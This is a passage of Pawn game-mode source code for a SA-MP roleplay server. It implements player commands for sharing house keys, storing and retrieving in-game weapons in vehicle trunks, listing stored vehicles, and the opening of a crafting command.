			format(vstring, sizeof(vstring), "%s\nEmpty", vstring);
		}
	}
	if(iValidVehicles != 0) {
		ShowPlayerDialogEx(playerid, REMOVEKEYS, DIALOG_STYLE_LIST, "Please select a vehicle.", vstring, "Remove Keys", "Cancel");
	} else SendClientMessage(playerid, COLOR_GRAD2, "You don't have any keys given out.");
	return 1;
}

CMD:givehousekeys(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "You don't own a house.");

	new
		giveplayerid,
		houseid,
		HasSomeoneBeeenGivenTheKey;

	if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID) {
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givehousekeys [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid)) {
			if(playerid == giveplayerid)
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't give the keys to yourself.");

			if(ProxDetectorS(8.0, playerid, giveplayerid)) {
				new
					szMessage[128];

				if(HouseKey[giveplayerid] != INVALID_HOUSE_ID)
					return SendClientMessage(playerid, COLOR_GRAD1, "They already have someone's house keys.");

				foreach(Player, i) {
					if(PlayerInfo[playerid][pHouse] == HouseKey[i]) HasSomeoneBeeenGivenTheKey++;
				}

				if(HasSomeoneBeeenGivenTheKey > 0)
					return SendClientMessage(playerid, COLOR_GRAD1, "You have given this key to someone already.");

				HouseKey[giveplayerid] = PlayerInfo[playerid][pHouse];
				format(szMessage, sizeof(szMessage), "%s has given you the key to their house.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, szMessage);
				format(szMessage, sizeof(szMessage), "You have given %s the keys to your house.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "You're not close enough to that player.");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	} else {
		if(sscanf(params, "ui", giveplayerid, houseid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givehousekeys [playerid/partofname] [house 1/2]");

		if(IsPlayerConnected(giveplayerid)) {
			if(playerid == giveplayerid)
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't give the keys to yourself.");

			if(ProxDetectorS(8.0, playerid, giveplayerid)) {
				new
					szMessage[128],
					firstorsecond[30];

				if(HouseKey[giveplayerid] != INVALID_HOUSE_ID)
					return SendClientMessage(playerid, COLOR_GRAD1, "They already have someone's house keys.");

				foreach(Player, i) {
					if(PlayerInfo[playerid][pHouse] == HouseKey[i]) HasSomeoneBeeenGivenTheKey = 1;
					else if(PlayerInfo[playerid][pHouse2] == HouseKey[i]) HasSomeoneBeeenGivenTheKey = 2;
					else { }
				}

				if(HasSomeoneBeeenGivenTheKey == 1 && houseid == 1)
					return SendClientMessage(playerid, COLOR_GRAD1, "You have given this key to someone already.");
				if(HasSomeoneBeeenGivenTheKey == 2 && houseid == 2)
					return SendClientMessage(playerid, COLOR_GRAD1, "You have given this key to someone already.");

				if(houseid == 1) {
					HouseKey[giveplayerid] = PlayerInfo[playerid][pHouse];
					firstorsecond = "first";
				} else if(houseid == 2) {
					HouseKey[giveplayerid] = PlayerInfo[playerid][pHouse2];
					firstorsecond = "second";
				}
				else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid house specified.");

				format(szMessage, sizeof(szMessage), "%s has given you the key to their %s house.", GetPlayerNameEx(playerid), firstorsecond);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, szMessage);
				format(szMessage, sizeof(szMessage), "You have given %s the keys to your %s house.", GetPlayerNameEx(giveplayerid), firstorsecond);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "You're not close enough to that player.");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
    return 1;
}

CMD:takehousekeys(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "You don't own a house.");

	new
		giveplayerid,
		houseid;

	if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID) {
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /takehousekeys [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid)) {
			if(playerid == giveplayerid)
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't take the keys from yourself.");
			new
				szMessage[128];

			if(HouseKey[giveplayerid] != INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse] == HouseKey[giveplayerid]) {
				HouseKey[giveplayerid] = INVALID_HOUSE_ID;
				format(szMessage, sizeof(szMessage), "%s has taken away the key to their house.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, szMessage);
				format(szMessage, sizeof(szMessage), "You have taken your house key from %s.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "That player does not have your house keys.");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	} else {
		if(sscanf(params, "ui", giveplayerid, houseid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /takehousekeys [playerid/partofname] [house 1/2]");

		if(IsPlayerConnected(giveplayerid)) {
			if(playerid == giveplayerid)
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't take the keys from yourself.");

			new
				szMessage[128],
				firstorsecond[30];

			if(HouseKey[giveplayerid] == PlayerInfo[playerid][pHouse] || HouseKey[giveplayerid] == PlayerInfo[playerid][pHouse2]) {
				if(houseid == 1 && HouseKey[giveplayerid] == PlayerInfo[playerid][pHouse]) {
					HouseKey[giveplayerid] = INVALID_HOUSE_ID;
					firstorsecond = "first";
				}
				else if(houseid == 2 && HouseKey[giveplayerid] == PlayerInfo[playerid][pHouse2]) {
					HouseKey[giveplayerid] = INVALID_HOUSE_ID;
					firstorsecond = "second";
				}
				else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid house specified.");

				format(szMessage, sizeof(szMessage), "%s has taken away the key to their %s house.", GetPlayerNameEx(playerid), firstorsecond);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, szMessage);
				format(szMessage, sizeof(szMessage), "You have taken away the key to your %s house from %s.", firstorsecond, GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "That player does not have your house keys.");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
    return 1;
}

CMD:housekeys(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "You don't own a house.");

	new
		szMessage[128],
		count;
	SendClientMessage(playerid, COLOR_GREEN, "--------------------- [ House Keys ] ---------------------");
	foreach(Player, i) {
		if(PlayerInfo[playerid][pHouse] == HouseKey[i] && PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID) {
			format(szMessage, sizeof(szMessage), "House 1 | %s (%i)", GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			count++;
		}else if(PlayerInfo[playerid][pHouse2] == HouseKey[i] && PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID) {
			format(szMessage, sizeof(szMessage), "House 2 | %s (%i)", GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			count++;
		}
	}
	if(count == 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You have not given anybody your house keys.");
    return 1;
}

CMD:information(playerid, params[]) {
	SendClientMessage(playerid, COLOR_WHITE, "Teamspeak: {EFEFEF}"TEAMSPEAK"{FFFFFF} | Website: {EFEFEF}" WEBSITE);
	return 1;
}

CMD:trunkput(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken") != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in an event.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid)) { SendClientMessage(playerid, COLOR_WHITE, "You can't do this while being inside the vehicle!"); return 1; }
	if(GetPVarInt(playerid, "EMSAttempt") != 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command!");

	if(PlayerInfo[playerid][pFaction] != 0 && PlayerInfo[playerid][pFaction] != 4)
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't do that while in a faction.");

	new string[128], weaponchoice[32], slot;
	if(sscanf(params, "s[32]d", weaponchoice, slot)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /trunkput [weapon] [slot]");

	new pvid = -1, Float: x, Float: y, Float: z;

	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
	{
		if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], x, y, z);
		if(IsPlayerInRangeOfPoint(playerid, 4.5, x, y, z))
		{
			pvid = d;
			break;
		}
	}
	if(pvid == -1) return SendClientMessage(playerid,COLOR_GREY,"You're not near any vehicle that you own.");
	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(PlayerVehicleInfo[playerid][pvid][pvId],engine,lights,alarm,doors,bonnet,boot,objective);
	if(boot == VEHICLE_PARAMS_OFF || boot == VEHICLE_PARAMS_UNSET) return SendClientMessage(playerid, COLOR_GRAD3, "You can't take/put stuff inside the trunk if it's closed!(/car trunk to open it)");
	if(GetVehicleModel(PlayerVehicleInfo[playerid][pvid][pvId]) == 481 || GetVehicleModel(PlayerVehicleInfo[playerid][pvid][pvId]) == 510)  return SendClientMessage(playerid,COLOR_GREY,"That vehicle doesn't have a trunk.");

	new Float: Health;
	GetPlayerHealth(playerid, Health);
	if(Health < 80.0) return SendClientMessage(playerid,COLOR_GREY,"You can't store weapons in a car when your health lower than 80.");
	if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
	{
		format(string, sizeof(string), "   You must wait %d seconds before depositing another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	new maxslots = PlayerVehicleInfo[playerid][pvid][pvWepUpgrade]+1;
	if(slot > maxslots)
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid slot.");
		return 1;
	}

	if(PlayerVehicleInfo[playerid][pvid][pvWeapons][slot-1] != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You have a weapon stored in that slot already.");
		return 1;
	}

	new weapon;
	if(strcmp(weaponchoice, "9mm", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 22 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a 9mm pistol into your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s deposited their 9mm pistol in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "sdpistol", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 23 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a silenced pistol into your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s deposited their silenced pistol in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "deagle", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 24 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a Desert Eagle in your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s deposited their Desert Eagle in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "shotgun", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 25 && PlayerInfo[playerid][pAGuns][3] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a shotgun in your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][3];
			format(string,sizeof(string), "* %s deposited their Shotgun in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "spas12", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 27 && PlayerInfo[playerid][pAGuns][3] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a combat shotgun in your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][3];
			format(string,sizeof(string), "* %s deposited their Combat Shotgun in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "mp5", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an MP5 in your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][4];
			format(string,sizeof(string), "* %s deposited their MP5 in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}

	else if(strcmp(weaponchoice, "ak47", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 30 && PlayerInfo[playerid][pAGuns][5] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an AK-47 in your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][5];
			format(string,sizeof(string), "* %s deposited their AK-47 in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "m4", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 31 && PlayerInfo[playerid][pAGuns][5] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an M4 in your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][5];
			format(string,sizeof(string), "* %s deposited their M4 in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "rifle", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 33 && PlayerInfo[playerid][pAGuns][6] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a rifle in your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][6];
			format(string,sizeof(string), "* %s deposited their rifle in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "sniper", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 34 && PlayerInfo[playerid][pAGuns][6] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a sniper rifle in your car gun locker.");
			weapon = PlayerInfo[playerid][pGuns][6];
			format(string,sizeof(string), "* %s deposited their sniper rifle in their car safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	if(weapon == 0) return SendClientMessage(playerid, COLOR_GREY, "You don't have that weapon.");
	if(PlayerVehicleInfo[playerid][pvid][pvWeapons][slot-1] == 0)
	{
		PlayerVehicleInfo[playerid][pvid][pvWeapons][slot-1] = weapon;
		RemovePlayerWeapon(playerid, weapon);
		return 1;
	}
	else { SendClientMessage(playerid,COLOR_GREY,"   Invalid weapon name!"); return 1; }
}

CMD:trunktake(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	if(IsPlayerInAnyVehicle(playerid)) {
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this while you're inside a vehicle.");
	}
	else if(GetPVarInt(playerid, "PBM") > 0) {
		return SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");
	}
	else if(GetPVarInt(playerid, "EventToken") != 0) {
		return SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in an event.");
	}
	else if(PlayerInfo[playerid][pConnectTime] < 2) {
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");
	}
	else if(GetPVarInt(playerid, "GiveWeaponTimer") >= 1) {

		new
			szMessage[59];

		format(szMessage, sizeof(szMessage), "   You must wait %d seconds before getting another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
		return SendClientMessage(playerid, COLOR_GREY, szMessage);
	}

	new
		Float: fVehPos[3],
		iWeaponSlot = strval(params);

	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++) {
		if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) {
			GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], fVehPos[0], fVehPos[1], fVehPos[2]);
			if(IsPlayerInRangeOfPoint(playerid, 4.5, fVehPos[0], fVehPos[1], fVehPos[2])) {
				if(isnull(params)) {

					new
						szMessage[64];

					format(szMessage, sizeof(szMessage), "*** %s's %s Safe ***", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]));
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
					for(new s = 0; s < 3; s++) if(PlayerVehicleInfo[playerid][d][pvWeapons][s] != 0) {

						new
							szWeapon[16];

						GetWeaponName(PlayerVehicleInfo[playerid][d][pvWeapons][s], szWeapon, sizeof(szWeapon));
						format(szMessage, sizeof(szMessage), "Slot %d: %s", s+1, szWeapon);
						SendClientMessage(playerid, COLOR_WHITE, szMessage);
					}
					return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /trunktake [slot]");
				}
				else if(GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 481 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 509) {
					return SendClientMessage(playerid,COLOR_GREY,"That vehicle doesn't have a trunk.");
				}

				new
					engine, lights, alarm, doors, bonnet, boot, objective;

				GetVehicleParamsEx(PlayerVehicleInfo[playerid][d][pvId], engine, lights, alarm, doors, bonnet, boot, objective);

				if(boot == VEHICLE_PARAMS_OFF || boot == VEHICLE_PARAMS_UNSET) {
					return SendClientMessage(playerid, COLOR_GRAD3, "You can't take weapons from the trunk if it's closed! /car trunk to open it.");
				}
				else if(iWeaponSlot > PlayerVehicleInfo[playerid][d][pvWepUpgrade] + 1) {
					return SendClientMessage(playerid, COLOR_GREY, "Invalid slot specified.");
				}
				else if(PlayerVehicleInfo[playerid][d][pvWeapons][iWeaponSlot - 1] != 0) {
					new
						szWeapon[16],
						szMessage[128];

					GetWeaponName(PlayerVehicleInfo[playerid][d][pvWeapons][iWeaponSlot - 1], szWeapon, sizeof(szWeapon));
					GivePlayerValidWeapon(playerid, PlayerVehicleInfo[playerid][d][pvWeapons][iWeaponSlot - 1], 60000);
					PlayerVehicleInfo[playerid][d][pvWeapons][iWeaponSlot - 1] = 0;

					format(szMessage, sizeof(szMessage), "You have withdrawn a %s from your car gun locker.", szWeapon);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);

					format(szMessage, sizeof(szMessage), "* %s has withdrawn a %s from their car safe.", GetPlayerNameEx(playerid), szWeapon);
					return ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else return SendClientMessage(playerid, COLOR_WHITE, "You don't have a weapon stored in that slot.");
			}
		}
	}
	return SendClientMessage(playerid,COLOR_GREY,"You're not near any vehicle that you own.");
}

CMD:trunkbalance(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
		return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this while you're inside a vehicle.");

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");

	if(GetPVarInt(playerid, "EventToken") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't use this while you're in an event.");

	if(PlayerInfo[playerid][pConnectTime] < 2)
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");

	new
		Float: fVehPos[3],
		iCount;

	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++) {
		if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) {
			GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], fVehPos[0], fVehPos[1], fVehPos[2]);
			if(IsPlayerInRangeOfPoint(playerid, 4.5, fVehPos[0], fVehPos[1], fVehPos[2])) {
				if(GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 481 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 509)
					return SendClientMessage(playerid,COLOR_GREY,"That vehicle doesn't have a trunk.");

				new
					engine, lights, alarm, doors, bonnet, boot, objective;

				GetVehicleParamsEx(PlayerVehicleInfo[playerid][d][pvId], engine, lights, alarm, doors, bonnet, boot, objective);
				if(boot == VEHICLE_PARAMS_OFF || boot == VEHICLE_PARAMS_UNSET)
					return SendClientMessage(playerid, COLOR_GRAD3, "You can't take weapons from the trunk if it's closed! /car trunk to open it.");

				new
					szMessage[64];

				format(szMessage, sizeof(szMessage), "*** %s's %s Safe ***", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]));
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
				for(new s = 0; s < 3; s++) if(PlayerVehicleInfo[playerid][d][pvWeapons][s] != 0) {
					new
						szWeapon[16];

					GetWeaponName(PlayerVehicleInfo[playerid][d][pvWeapons][s], szWeapon, sizeof(szWeapon));
					format(szMessage, sizeof(szMessage), "Slot %d: %s", s+1, szWeapon);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);
				}
				iCount ++;
			}
		}
	}
	if(iCount == 0)
		return SendClientMessage(playerid,COLOR_GREY,"You're not near any vehicle that you own.");
	return 1;
}

CMD:vstorage(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	new vstring[1024];
	for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
		if((iModelID = PlayerVehicleInfo[playerid][i][pvModelId] - 400) >= 0) {
			if(PlayerVehicleInfo[playerid][i][pvImpounded]) {
				format(vstring, sizeof(vstring), "%s\n%s (impounded)", vstring, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvDisabled]) {
				format(vstring, sizeof(vstring), "%s\n%s (disabled)", vstring, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvSpawned] != 1) {
				format(vstring, sizeof(vstring), "%s\n%s (stored)", vstring, VehicleName[iModelID]);
			}
			else format(vstring, sizeof(vstring), "%s\n%s (spawned)", vstring, VehicleName[iModelID]);
		}
		else strcat(vstring, "\nEmpty");
	}
	ShowPlayerDialogEx(playerid, VEHICLESTORAGE, DIALOG_STYLE_LIST, "Vehicle storage", vstring, "(De)spawn", "Cancel");
	return 1;
}

CMD:craft(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	if(PlayerInfo[playerid][pJob] != 18 && PlayerInfo[playerid][pJob2] != 18)
	{
		SendClientMessage(playerid,COLOR_GREY,"   You're not a Craftsman!");
		return 1;
	}
	if(PlayerInfo[playerid][pJailTime] > 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"   You can't make things while in jail or prison!");
		return 1;
	}
	new string[128];
	if(GetPVarInt(playerid, "ArmsTimer") > 0)
	{
		format(string, sizeof(string), "   You must wait %d seconds before crafting again.", GetPVarInt(playerid, "ArmsTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}
	if(GetPVarInt(playerid, "Hospital") == 1 || GetPVarInt(playerid, "Hospital") == 2 || GetPVarInt(playerid, "Hospital") == 3 || GetPVarInt(playerid, "Hospital") == 4 || GetPVarInt(playerid, "Hospital") == 5)
	{
		SendClientMessage(playerid, COLOR_GREY, "You can't craft whilst in Hospital.");
		return 1;
	}

	new giveplayerid, choice[32], weapon, price;
	if(sscanf(params, "us[32]", giveplayerid, choice))
	{
		SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
		SendClientMessage(playerid, COLOR_YELLOW, "<< Available crafts >>");
		SendClientMessage(playerid, COLOR_GRAD1, "screwdriver(1000)");
		SendClientMessage(playerid, COLOR_GRAD1, "wristwatch(500) 	tire(250)");
		SendClientMessage(playerid, COLOR_GRAD1, "firstaid(1000)	 camera(250)");
		SendClientMessage(playerid, COLOR_GRAD1, "rccam(8000)	     receiver(5000)");
		SendClientMessage(playerid, COLOR_GRAD1, "gps(1000)          bugsweep(10000)");
		SendClientMessage(playerid, COLOR_GRAD1, "parachute(50)");
		SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /craft [playerid/partofname] [craftname]");
		return 1;
	}
	if(IsPlayerConnected(giveplayerid))
	{
		if(isnull(choice))
		{
			SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
			SendClientMessage(playerid, COLOR_YELLOW, "<< Available crafts >>");
			SendClientMessage(playerid, COLOR_GRAD1, "screwdriver(1000)");
			SendClientMessage(playerid, COLOR_GRAD1, "wristwatch(500) 	tire(250)");
			SendClientMessage(playerid, COLOR_GRAD1, "firstaid(1000)	 camera(250)");
			SendClientMessage(playerid, COLOR_GRAD1, "rccam(8000)	     receiver(5000)");
			SendClientMessage(playerid, COLOR_GRAD1, "gps(1000)          bugsweep(10000)");
			SendClientMessage(playerid, COLOR_GRAD1, "parachute(50)");
			SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /craft [playerid/partofname] [craftname]");
